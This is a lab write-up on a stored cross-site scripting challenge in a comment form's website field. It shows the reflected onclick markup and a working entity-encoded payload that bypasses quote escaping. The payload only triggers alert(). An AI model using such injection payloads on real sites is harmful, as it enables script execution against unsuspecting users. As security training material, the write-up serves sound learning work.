### Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

Note: the &apos; sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.
_____

Analysis and Exploit:

1. Posted a test comment with params testcomment, testname, testemail{at}email, http{colon}//testhttp

    ```html
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">
        
        <a id="author" href="http://testhttp" onclick="var tracker={track(){}};tracker.track('http://testhttp');">testname</a> | 02 May 2023
    </p>
    ```

    HTML input requires substring _http:_ or _https:_ to be included in the website string

    ```html
    <label>Website:</label>
    <input pattern="(http:|https:).+" type="text" name="website">
    ```

2. Injected payload ```http:&apos;-alert(1)-&apos;```

    Output: 
    ```html
    <a id="author" href="http:&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('http:&apos;-alert(1)-&apos;');"
    ```

3. Clicked on the author name to trigger the stored XSS